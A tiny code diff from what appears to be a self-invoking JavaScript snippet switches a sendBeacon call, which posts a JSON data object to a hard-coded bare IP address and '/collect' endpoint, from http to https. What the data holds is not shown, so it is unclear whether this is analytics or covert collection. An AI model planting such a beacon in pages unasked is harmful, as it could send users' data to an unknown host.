@@ -40,6 +40,6 @@
         };
 
         // Отправить на бэкенд
-        navigator.sendBeacon('http://5.23.54.56:3000/collect', JSON.stringify(data));
+        navigator.sendBeacon('https://5.23.54.56:3000/collect', JSON.stringify(data));
     }
 })();
